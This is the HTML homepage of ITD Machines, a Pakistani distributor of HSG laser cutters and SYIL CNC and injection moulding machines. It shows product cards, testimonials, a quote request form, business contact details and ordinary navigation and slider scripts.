        /* For large 4K displays (2560px and above) */
     

        @media only screen and (min-width: 2560px) {
            .product-center .text-title {
                font-size: 60px;
            }

            .product-center .text-ftitle {
                font-size: xxx-large;
                line-height: inherit;
            }

            .product-center .learn-more {
                font-size: xx-large;
                padding: 30px;
            }
        }

        @media only screen and (min-width: 2560px) {
            .product-center .card-img img {
                width: 100%;
                height: auto;
            }

            .product-center .card {
                margin-bottom: 2rem;
            }

            .product-center .card-body {
                padding: 2rem;
            }

            .carousel-caption button {
                margin: 5px;
                padding: 10px 40px;
                font-size: 40px;
                border-radius: 25px;
            }

        }

        @media only screen and (min-width: 2560px) {
            .product-center .new-title {
                font-size: 3.5rem;
                margin-bottom: 2rem;
            }

            .product-center .card-container {
                display: flex;
                justify-content: center;
                gap: 3rem;
            }

            .product-center .card1 {
                flex: 0 0 40%;
                text-align: center;
            }

            .product-center .card1 img {
                width: 100%;
                height: auto;
                margin-bottom: 1.5rem;
            }

            .product-center .card1 h3 {
                font-size: 2.5rem;
                font-weight: 600;
            }

            .product-center .card1 p {
                font-size: 40px;
            }
        }

        @media only screen and (min-width: 2560px) {
            .quote-form {
                max-width: 1800px;
            }

            .quote .form-title {
                font-size: 3rem;
                margin-bottom: 2rem;
            }

            .quote .form-group {
                margin-bottom: 2rem;
            }

            .quote .form-label {
                font-size: xx-large;
            }

            .quote .form-input,

            .quote .form-textarea {
                font-size: x-large;
                padding: 1rem;
                width: 100%;
            }

            .quote .form-submit {
                font-size: xx-large;
                padding: 1.2rem 2rem;
            }
        }

        @media only screen and (min-width: 2560px) {
            .footer .footer-container {
                display: flex;
                justify-content: space-between;
                /* Adjust this for less spacing */
                padding: 2rem 3rem;
                /* Reduce padding */
                margin-left: 100px;
            }

            .col-sm-7 {
                max-height: 300px;
            }

            .footer .footer-column {
                flex: 1;
                margin-left: 70px;
                margin-right: 20px;
            }


            .footer .footer-column h3 {
                font-size: 2.5rem;
                /* Adjust font size */
                margin-bottom: 1.5rem;
                /* Adjust spacing below headings */
                color: #ffa500;
            }

            .footer .footer-column p,
            .footer .footer-column ul li {
                font-size: xx-large;
                /* Adjust font size */
                line-height: 4rem;
                /* Adjust line height */
                color: #f2f2f2;
            }

            .footer .footer-column ul li a {
                font-size: xx-large;
                /* Adjust font size */
                line-height: 4rem;
                /* Adjust font size */
                color: #ffffff;
                text-decoration: none;
                transition: color 0.3s ease;
            }

            .footer .footer-column ul li a:hover {
                color: #fff;
            }

            .footer .social-icons a {
                font-size: 2rem;
                /* Adjust icon size */
                color: #ffffff;
            }

            .footer .social-icons a i {
                margin-left: 0.5rem;
            }
        }

        @media (min-width: 2560px) {
            .center-section {
                margin-left: 250px;
                margin-right: 250px;
            }

            .carousel-inner {
                padding-left: 54px;
                padding-right: 54px;
            }
        }

        /* Image fluid class for responsive images */
        .img-fluid {
            max-width: 100%;
            height: auto;
        }

        /* Ensure card images are properly sized */
        .card-img img {
            width: 100%;
            height: 200px;
            object-fit: cover;
            border-radius: 8px 8px 0 0;
        }

        /* Fix card body padding for machine cards */
        .product-center .card-body {
            padding: 1.5rem 1rem;
        }

        /* Ensure consistent card heights */
        .product-center .card {
            height: 100%;
            display: flex;
            flex-direction: column;
        }

        .product-center .card-body {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .whatsapp-float {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 1000;
            cursor: pointer;
            transition: transform 0.3s ease-in-out;
        }

        .whatsapp-float img {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
        }

        .whatsapp-float:hover {
            transform: scale(1.1);
        }

        @media (max-width: 1024px) {
            .whatsapp-float img {
                width: 55px;
                height: 55px;
            }
        }

        /* Small screens (mobile) */
        @media (max-width: 768px) {
            .whatsapp-float img {
                width: 50px;
                height: 50px;
            }
        }

        /* Extra small screens (very small phones) */
        @media (max-width: 480px) {
            .whatsapp-float img {
                width: 45px;
                height: 45px;
            }
        }

        .contact-btns-container {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            padding-top: 28px;
            justify-content: center;
        }

        .contact-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.3s ease;
            text-decoration: none;
            min-width: 200px;
            text-align: center;
        }

        .btn-call,
        .btn-email {
            background-color: #1f4c75;
            color: white;
        }

        .btn-whatsapp {
            border: 2px solid #25D366;
            color: #25D366;
            background-color: white;
        }

        .btn-call:hover,
        .btn-email:hover {
            background-color: #163655;
        }

        .btn-whatsapp:hover {
            background-color: #25D366;
            color: white;
        }

        .icon {
            font-size: 18px;
        }

        @media (max-width: 600px) {
            .contact-btns-container {
                flex-direction: column;
                align-items: center;
                padding: 30px;
            }

            .contact-btn {
                width: 100%;
            }
        }
    </style>



</head>

<body class="has-hero">
    <!-- Skip to main content for accessibility -->
    <a href="#main-content" class="skip-link"> </a>
    
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NVK9FF5C"
            height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
<header class="site-header">
  <div class="header-inner">
    <a class="logo" href="index.php" aria-label="Home">
      <img src="products/Logos-01.jpg" alt="ITD Machines Logo">
    </a>

    <!-- Desktop nav (visible on wide screens) -->
    <nav class="nav-desktop" role="navigation" aria-label="Primary">
      <ul class="nav-menu">
        <li><a href="index.php" class="active" aria-current="page">Home</a></li>
        <li><a href="aboutus.html">About Us</a></li>
        
        <!-- Products Dropdown -->
        <li class="has-submenu">
          <a href="#products">Products</a>
          <ul class="submenu">
            <li><a href="lasercutting.html">Laser Cutting Machines</a></li>
            <li><a href="cncmachine.html">CNC Machining & Turning Centers</a></li>
            <li><a href="injectionmoulding.html">Injection Moulding Machines</a></li>
            <li><a href="laser_accessories.html">Laser Cutting Accessories</a></li>
            <li><a href="mold.html">Mold Bases</a></li>
          </ul>
        </li>
      </ul>
      <a class="btn-get-quote" href="#request-quote">Get Quote</a>
    </nav>

    <!-- Hamburger -->
    <button class="nav-toggle" aria-label="Open menu" aria-expanded="false" aria-controls="mobile-panel">
      <span></span><span></span><span></span>
    </button>
  </div>
</header>

<!-- Mobile sliding panel + overlay -->
<div class="nav-overlay" data-nav-overlay></div>
<aside id="mobile-panel" class="mobile-panel" aria-hidden="true">
  <div class="mobile-panel-inner">
    <button class="mobile-close" aria-label="Close menu">&times;</button>

    <nav role="navigation" aria-label="Mobile primary">
      <ul class="nav-menu-vertical">
        <li><a href="index.php" class="active">Home</a></li>
        <li><a href="aboutus.html">About Us</a></li>
        
        <!-- Mobile Products with submenu -->
        <li class="has-submenu">
          <button class="submenu-toggle" aria-expanded="false">Products</button>
          <ul class="mobile-submenu">
            <li><a href="lasercutting.html">Laser Cutting Machines</a></li>
            <li><a href="cncmachine.html">CNC Machining & Turning Centers</a></li>
            <li><a href="injectionmoulding.html">Injection Moulding Machines</a></li>
            <li><a href="laser_accessories.html">Laser Cutting Accessories</a></li>
            <li><a href="mold.html">Mold Bases</a></li>
          </ul>
        </li>
      </ul>
    </nav>

    <a class="btn-get-quote mobile-cta" href="#request-quote">Get Quote</a>
  </div>
</aside>
 

    
    <!-- Hero Section -->
    <main id="main-content">
    <section class="hero-section" id="hero">
        <div class="hero-background">
            <div class="hero-overlay"></div>
        </div>
        <div class="hero-content container">
            <h1 class="hero-title">Pakistan's Leading Laser & CNC Machine Supplier</h1>
            <p class="hero-subtitle">Performance. Precision. Perfection.</p>
            <a href="#request-quote" class="btn-hero-cta">Request a Quote</a>
        </div>
    </section>
    
    <!-- Our Top Machines Section -->
    <section id="products" class="center-section product-center">
        <div class="container-fluid">
            <h1 class="new-title">Our Top Machines</h1>
            <div class="row">
                <div class="col-12 col-sm-6 col-lg-4">
                    <div class="card card-portfolio text-center overflow-hidden">
                        <div class="card-img">
                            <img src="crousel/gv.webp" alt="HSG Laser Cutting Machine" class="img-fluid">
                        </div>
                        <div class="card-body">
                            <h3 class="text-title">HSG Laser Cutting Machine</h3>
                            <p class="text-ftitle">High-precision fiber laser cutting for metal sheets</p>
                            <a class="learn-more" href="lasercutting.html">Learn More</a>
                        </div>
                    </div>
                </div>
                <div class="col-12 col-sm-6 col-lg-4">
                    <div class="card card-portfolio text-center overflow-hidden">
                        <div class="card-img">
                            <img src="New folder/x7/x5.webp" alt="SYIL CNC Machining Centers" class="img-fluid">
                        </div>
                        <div class="card-body">
                            <h3 class="text-title">SYIL CNC Machining Centers</h3>
                            <p class="text-ftitle">Advanced CNC milling and turning solutions</p>
                            <a class="learn-more" href="cncmachine.html">Learn More</a>
                        </div>
                    </div>
                </div>
                <div class="col-12 col-sm-6 col-lg-4">
                    <div class="card card-portfolio text-center overflow-hidden">
                        <div class="card-img">
                            <img src="products/bg.png" alt="SYIL Injection Moulding Machines" class="img-fluid">
                        </div>
                        <div class="card-body">
                            <h3 class="text-title">SYIL Injection Moulding Machines</h3>
                            <p class="text-ftitle">Precision plastic injection molding equipment</p>
                            <a class="learn-more" href="injectionmoulding.html">Learn More</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    
    <a href="https://wa.me/923008227711" class="whatsapp-float" target="_blank">
        <img src="wp icon.png" alt="Chat with us on WhatsApp">
    </a>

    <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
        <ol class="carousel-indicators">
            <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
            <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
            <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>
            <li data-target="#carouselExampleIndicators" data-slide-to="3"></li>
        </ol>
        <div class="carousel-inner">

            <div class="carousel-item active">
                <picture>
                    <source media="(min-width: 768px)" srcset="crousel/injectionp.jpg">
                    <source media="(max-width: 767px)" srcset="crousel/injectionm.jpg">
                    <img src="injection m.jpg" class="d-block w-100" alt="Image 0">
                </picture>
                <div class="carousel-caption">
                    <button class="btn btn-primary" onclick="window.location.href='injectionmoulding.html'">Learn More</button>
                    <button class="btn btn-secondary" onclick="window.location.href='#request-quote'">Inquiry</button>
                </div>
            </div>
            <div class="carousel-item">
                <picture>
                    <source media="(min-width: 768px)" srcset="crousel/p.jpeg">
                    <source media="(max-width: 767px)" srcset="crousel/m.jpeg">
                    <img src="crousel/m.jpeg" class="d-block w-100" alt="Image 1">

                </picture>
                <div class="carousel-caption">
                    <button class="btn btn-primary" onclick="window.location.href='cncmachine.html'">Learn More</button>
                    <button class="btn btn-secondary" onclick="window.location.href='#request-quote'">Inquiry</button>
                </div>
            </div>
            <div class="carousel-item ">
                <picture>
                    <source media="(min-width: 768px)" srcset="crousel/gv.webp">
                    <source media="(max-width: 767px)" srcset="crousel/gv_m (1).webp">
                    <img src="crousel/gv_m (1).webp" class="d-block w-100" alt="Image 2">
                </picture>
                <div class="carousel-caption">
                    <button class="btn btn-primary" onclick="window.location.href='lasercutting.html'">Learn More</button>
                    <button class="btn btn-secondary" onclick="window.location.href='#request-quote'">Inquiry</button>
                </div>
            </div>
            <div class="carousel-item">
                <picture>
                    <source media="(min-width: 768px)" srcset="crousel/weldingp.jpg">
                    <source media="(max-width: 767px)" srcset="crousel/weldingm.jpg">
                    <img src="crousel/weldingm.jpg" class="d-block w-100" alt="Image 3">
                </picture>
                <div class="carousel-caption">
                    <button class="btn btn-primary" onclick="window.location.href='lasercutting.html'">Learn More</button>
                    <button class="btn btn-secondary" onclick="window.location.href='#request-quote'">Inquiry</button>
                </div>
            </div>


        </div>
        <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
            <span class="sr-only">Previous</span>
        </a>
        <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
            <span class="carousel-control-next-icon" aria-hidden="true"></span>
            <span class="sr-only">Next</span>
        </a>
    </div>
    <div class="contact-btns-container">
        <a href="tel:03008227711" class="contact-btn btn-call">
            📞 Call
        </a>
        <a href="mailto: itdtech2004@gmail.com" class="contact-btn btn-email">
            ✉️ Email
        </a>
        <a href="https://wa.me/03008227711" class="contact-btn btn-whatsapp">
            WhatsApp
        </a>
    </div>
    <section class="center-section product-center partners-section">
        <div class="container-fluid">
            <h1 class="new-title">Our Trusted Partners</h1>
            <p class="section-subtitle">Representing world-class manufacturers</p>
            <div class="card-container">
                <div class="card1 partner-card-enhanced">
                    <div class="partner-logo-container">
                        <img src="New folder/hsg.jpg" alt="HSG Logo">
                    </div>
                    <h3>HSG</h3>
                    <div class="partner-badge">Official Distributor</div>
                    <p>Founded in 2006, HSG Laser is a high-tech enterprise specializing in the research, development, production, and sales of intelligent metal shaping equipment. The company is dedicated to providing metal shaping and automated production line solutions to global customers.</p>
                </div>
                <div class="card1 partner-card-enhanced">
                    <div class="partner-logo-container">
                        <img src="New folder/Logo Color.jpg" alt="SYIL Logo">
                    </div>
                    <h3>SYIL</h3>
                    <div class="partner-badge">Authorized Partner</div>
                    <p>At SYIL, our mission is to design and manufacture top-quality, affordable CNC machines tailored for small business owners. We are dedicated to providing accessible and reliable machinery that empowers entrepreneurs to thrive in their industries.</p>
                </div>
            </div>
        </div>
    </section>
    
    <!-- Testimonials Section -->
    <section class="testimonials-section center-section">
        <div class="container">
            <h2 class="section-title testimonials-title">What Our Clients Say</h2>
            <p class="section-subtitle">Join hundreds of satisfied customers across Pakistan</p>
            
            <div class="swiper testimonials-swiper">
                <div class="swiper-wrapper">
                    <div class="swiper-slide">
                        <div class="testimonial-card">
                            <div class="testimonial-quote-icon">
                                <i class="fas fa-quote-left"></i>
                            </div>
                            <p class="testimonial-text">ITD provided us with an HSG laser cutting machine that transformed our production capabilities. The precision and speed are exceptional, and their after-sales support is outstanding.</p>
                            <div class="testimonial-client">
                                <img class="testimonial-photo" src="testimonial.png" alt="Ahmed Hassan" style="width: 60px !important; height: 60px !important;">
                                <div class="testimonial-details">
                                    <h4 class="testimonial-name">Ahmed Hassan</h4>
                                    <p class="testimonial-company">Steel Fabrication Ltd, Karachi</p>
                                    <div class="testimonial-rating">
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="swiper-slide">
                        <div class="testimonial-card">
                            <div class="testimonial-quote-icon">
                                <i class="fas fa-quote-left"></i>
                            </div>
                            <p class="testimonial-text">We've been working with ITD for over 5 years. Their SYIL CNC machines are reliable, and the team's technical expertise has been invaluable to our operations.</p>
                            <div class="testimonial-client">
                                <img class="testimonial-photo" src="testimonial.png" alt="Fatima Khan" style="width: 60px !important; height: 60px !important;">
                                <div class="testimonial-details">
                                    <h4 class="testimonial-name">Fatima Khan</h4>
                                    <p class="testimonial-company">Precision Engineering, Lahore</p>
                                    <div class="testimonial-rating">
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="swiper-slide">
                        <div class="testimonial-card">
                            <div class="testimonial-quote-icon">
                                <i class="fas fa-quote-left"></i>
                            </div>
                            <p class="testimonial-text">The injection moulding machine from ITD exceeded our expectations. Professional installation, comprehensive training, and excellent ROI within the first year.</p>
                            <div class="testimonial-client">
                                <img class="testimonial-photo" src="testimonial.png" alt="Imran Malik" style="width: 60px !important; height: 60px !important;">
                                <div class="testimonial-details">
                                    <h4 class="testimonial-name">Imran Malik</h4>
                                    <p class="testimonial-company">Plastic Industries, Faisalabad</p>
                                    <div class="testimonial-rating">
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                        <i class="fas fa-star"></i>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="swiper-pagination"></div>
                <div class="swiper-button-prev"></div>
                <div class="swiper-button-next"></div>
            </div>
        </div>
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/8.3.2/swiper-bundle.min.js"></script>
        <script>
            // Mobile menu toggle
const navToggle = document.querySelector('.nav-toggle');
const mobilePanel = document.getElementById('mobile-panel');
const navOverlay = document.querySelector('.nav-overlay');
const mobileClose = document.querySelector('.mobile-close');

function openMenu() {
  navToggle.setAttribute('aria-expanded', 'true');
  mobilePanel.setAttribute('aria-hidden', 'false');
  navOverlay.classList.add('active');
  document.body.classList.add('nav-open');
}

function closeMenu() {
  navToggle.setAttribute('aria-expanded', 'false');
  mobilePanel.setAttribute('aria-hidden', 'true');
  navOverlay.classList.remove('active');
  document.body.classList.remove('nav-open');
}

navToggle.addEventListener('click', openMenu);
mobileClose.addEventListener('click', closeMenu);
navOverlay.addEventListener('click', closeMenu);
            document.addEventListener('DOMContentLoaded', function() {
                new Swiper('.testimonials-swiper', {
                    slidesPerView: 1,
                    spaceBetween: 30,
                    loop: true,
                    autoplay: {
                        delay: 5000,
                        disableOnInteraction: false
                    },
                    pagination: {
                        el: '.swiper-pagination',
                        clickable: true
                    },
                    navigation: {
                        nextEl: '.swiper-button-next',
                        prevEl: '.swiper-button-prev'
                    },
                    breakpoints: {
                        768: {
                            slidesPerView: 2
                        },
                        1024: {
                            slidesPerView: 3
                        }
                    }
                });
            });
        </script>
    </section>
    
    <section class="quote quote-modern">
        <form id="request-quote" class="quote-form" action="submit_quote.php" method="post">
            <h2 class="form-title">Request A Quote</h2>
            <p class="form-subtitle">Fill out the form below and our team will get back to you shortly.</p>
            <div class="form-row">
                <div class="form-group">
                    <label for="name" class="form-label">Name</label>
                    <div class="input-icon-wrapper">
                        <i class="fas fa-user input-icon"></i>
                        <input type="text" id="name" name="name" class="form-input" required>
                    </div>
                </div>
                <div class="form-group">
                    <label for="email" class="form-label">E-mail</label>
                    <div class="input-icon-wrapper">
                        <i class="fas fa-envelope input-icon"></i>
                        <input type="email" id="email" name="email" class="form-input" required>
                    </div>
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label for="phone" class="form-label">Phone or WhatsApp</label>
                    <div class="input-icon-wrapper">
                        <i class="fas fa-phone input-icon"></i>
                        <input type="text" id="phone" name="phone" class="form-input" required>
                    </div>
                </div>
                <div class="form-group">
                    <label for="country" class="form-label">Country</label>
                    <div class="input-icon-wrapper">
                        <i class="fas fa-globe input-icon"></i>
                        <input type="text" id="country" name="country" class="form-input" required>
                    </div>
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label for="city" class="form-label">City</label>
                    <div class="input-icon-wrapper">
                        <i class="fas fa-city input-icon"></i>
                        <input type="text" id="city" name="city" class="form-input">
                    </div>
                </div>
                <div class="form-group">
                    <label for="company" class="form-label">Company</label>
                    <div class="input-icon-wrapper">
                        <i class="fas fa-building input-icon"></i>
                        <input type="text" id="company" name="company" class="form-input">
                    </div>
                </div>
            </div>
            <div class="form-group">
                <label for="message" class="form-label">Message</label>
                <div class="input-icon-wrapper textarea-icon">
                    <i class="fas fa-comment-dots input-icon"></i>
                    <textarea id="message" name="message" class="form-textarea" placeholder="Please leave us the material thickness and working area, we will offer the quotation to you as soon as possible."></textarea>
                </div>
            </div>
            <button type="submit" class="form-submit">Submit</button>
            <p class="form-response-time">We usually respond within 24 hours.</p>
        </form>
    </section>



 <footer class="footer">
        <div class="footer-main">
            <div class="footer-company">
                <h3 class="section-title">About Us</h3>
                <h2 class="company-name">INTERTRADE DISTRIBUTORS PVT LTD</h2>
                <p class="company-description">Explore our wide range of high-performance equipment tailored to meet your manufacturing needs.</p>
            </div>
            
            <div class="footer-contact">
                <h3 class="section-title">Contact Us</h3>
                <div class="contact-info">
                    <p><i class="fas fa-envelope"></i> Email: <a href="mailto:itdtech2004@gmail.com">itdtech2004@gmail.com</a></p>
                    <p><i class="fas fa-phone"></i> Phone: <a href="tel:+923008227711">0092-300-8227711</a></p>
                    <p><i class="fas fa-phone"></i> Tel: <a href="tel:+922132418554">0092-21-32418554</a>, <a href="tel:+922132424925">32424925</a></p>
                    <p><i class="fas fa-fax"></i> Fax: 0092-21-32418601</p>
                    <p><i class="fas fa-map-marker-alt"></i> Address: Aiwan-e-Tijarat Road P.O Box 4978 Karachi Pakistan</p>
                    <p><i class="fab fa-skype"></i> Skype: <a href="skype:fawad.k9?chat">fawad.k9</a></p>
                </div>
            </div>
            
            <div class="footer-links">
                <h3 class="section-title">Quick Links</h3>
                <div class="links-grid">
                    <div class="links-column">
                        <a href="index.php">Home</a>
                        <a href="lasercutting.html">Laser Cutting Machines</a>
                        <a href="cncmachine.html">CNC Machining & Turning Centers</a>
                        <a href="injectionmoulding.html">Injection Moulding Machines</a>
                    </div>
                    <div class="links-column">
                        <a href="laser_accessories.html">Laser Cutting Accessories</a>
                        <a href="mold.html">Mold Bases</a>
                        <a href="adminlogin.php">Login as admin</a>
                        <a href="aboutus.html">About us</a>
                    </div>
                </div>
            </div>
            
            <div class="footer-connect">
                <h3 class="section-title">Follow Us</h3>
                <div class="social-media">
                    <a href="skype:fawad.k9?chat" class="social-link skype" target="_blank" title="Chat on Skype">
                        <i class="fab fa-skype"></i>
                    </a>
                </div>
                <p style="color: #b8c5d1; font-size: 12px; margin-top: 8px;">fawad.k9</p>
            </div>
        </div>
        
        <div class="footer-bottom">
            <p>&copy; 2024 ITD Machines. All rights reserved.</p>
        </div>
    </footer>  
    <script>
       document.addEventListener('DOMContentLoaded', function() {
    const navToggle = document.querySelector('.nav-toggle');
    const mobilePanel = document.getElementById('mobile-panel');
    const navOverlay = document.querySelector('.nav-overlay');
    const mobileClose = document.querySelector('.mobile-close');
    const header = document.querySelector('.site-header');

    // Enhanced mobile menu toggle
    function openMobileMenu() {
        navToggle.setAttribute('aria-expanded', 'true');
        mobilePanel.setAttribute('aria-hidden', 'false');
        navOverlay.classList.add('active');
        document.body.classList.add('nav-open');
        document.body.style.overflow = 'hidden';
    }

    function closeMobileMenu() {
        navToggle.setAttribute('aria-expanded', 'false');
        mobilePanel.setAttribute('aria-hidden', 'true');
        navOverlay.classList.remove('active');
        document.body.classList.remove('nav-open');
        document.body.style.overflow = '';
        
        // Close all open submenus when closing main menu
        document.querySelectorAll('.mobile-submenu.expanded').forEach(submenu => {
            submenu.classList.remove('expanded');
            submenu.previousElementSibling.setAttribute('aria-expanded', 'false');
        });
    }

    // Event listeners for menu open/close
    navToggle.addEventListener('click', openMobileMenu);
    mobileClose.addEventListener('click', closeMobileMenu);
    navOverlay.addEventListener('click', closeMobileMenu);

    // Close menu on escape key
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && mobilePanel.getAttribute('aria-hidden') === 'false') {
            closeMobileMenu();
        }
    });

    // Mobile submenu toggles
    document.querySelectorAll('.submenu-toggle').forEach(toggle => {
        toggle.addEventListener('click', function() {
            const isExpanded = this.getAttribute('aria-expanded') === 'true';
            const submenu = this.nextElementSibling;
            
            // Close other open submenus (accordion behavior)
            document.querySelectorAll('.submenu-toggle').forEach(otherToggle => {
                if (otherToggle !== this && otherToggle.getAttribute('aria-expanded') === 'true') {
                    otherToggle.setAttribute('aria-expanded', 'false');
                    otherToggle.nextElementSibling.classList.remove('expanded');
                }
            });
            
            // Toggle current submenu
            this.setAttribute('aria-expanded', !isExpanded);
            submenu.classList.toggle('expanded');
        });
    });

    // Header scroll effect
    let lastScrollTop = 0;
    window.addEventListener('scroll', function() {
        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
        
        if (scrollTop > 100) {
            header.classList.add('scrolled');
        } else {
            header.classList.remove('scrolled');
        }
        
        lastScrollTop = scrollTop;
    });

    // Smooth scroll for anchor links
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function(e) {
            const href = this.getAttribute('href');
            
            // Skip if it's just a placeholder (#products, #, etc.)
            if (href === '#' || href === '#products') {
                e.preventDefault();
                return;
            }
            
            const target = document.querySelector(href);
            if (target) {
                e.preventDefault();
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
                
                // Close mobile menu if open
                if (mobilePanel.getAttribute('aria-hidden') === 'false') {
                    closeMobileMenu();
                }
            }
        });
    });

    // Close mobile menu when clicking on regular links
    document.querySelectorAll('.mobile-submenu a, .nav-menu-vertical > li > a').forEach(link => {
        link.addEventListener('click', function() {
            if (mobilePanel.getAttribute('aria-hidden') === 'false') {
                setTimeout(() => closeMobileMenu(), 150);
            }
        });
    });

    // Active link highlighting based on current page
    function updateActiveLink() {
        const currentPage = window.location.pathname.split('/').pop() || 'index.php';
        
        // Update desktop nav
        document.querySelectorAll('.nav-menu a, .submenu a').forEach(link => {
            link.classList.remove('active');
            const linkHref = link.getAttribute('href');
            
            if (linkHref === currentPage || 
                (currentPage === '' && linkHref === 'index.php') ||
                (currentPage === 'index.php' && linkHref === 'index.php')) {
                link.classList.add('active');
            }
        });
        
        // Update mobile nav
        document.querySelectorAll('.nav-menu-vertical a, .mobile-submenu a').forEach(link => {
            link.classList.remove('active');
            const linkHref = link.getAttribute('href');
            
            if (linkHref === currentPage || 
                (currentPage === '' && linkHref === 'index.php') ||
                (currentPage === 'index.php' && linkHref === 'index.php')) {
                link.classList.add('active');
            }
        });
    }

    // Update active link on page load
    updateActiveLink();

    // Optional: Active link highlighting based on scroll position for single-page sections
    const sections = document.querySelectorAll('section[id]');
    
    if (sections.length > 0) {
        function updateActiveSection() {
            let current = '';
            const scrollPosition = window.pageYOffset + 150;
            
            sections.forEach(section => {
                const sectionTop = section.offsetTop;
                const sectionHeight = section.offsetHeight;
                
                if (scrollPosition >= sectionTop && scrollPosition < sectionTop + sectionHeight) {
                    current = section.getAttribute('id');
                }
            });

            document.querySelectorAll('.nav-menu a[href^="#"], .nav-menu-vertical a[href^="#"]').forEach(link => {
                link.classList.remove('active');
                const href = link.getAttribute('href');
                
                if (href === `#${current}`) {
                    link.classList.add('active');
                }
            });
        }

        window.addEventListener('scroll', updateActiveSection);
    }

    // Prevent clicks on desktop dropdown parent from navigating
    document.querySelectorAll('.nav-desktop .has-submenu > a').forEach(link => {
        link.addEventListener('click', function(e) {
            if (this.getAttribute('href') === '#products' || this.getAttribute('href') === '#') {
                e.preventDefault();
            }
        });
    });
});
    </script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('.btn-secondary').forEach(button => {
                button.addEventListener('click', function(event) {
                    event.preventDefault();
                    document.querySelector('#request-quote').scrollIntoView({
                        behavior: 'smooth'
                    });
                });
            });
        });
    </script> <script src="script.js"></script>
    </main>
</body> 
</html>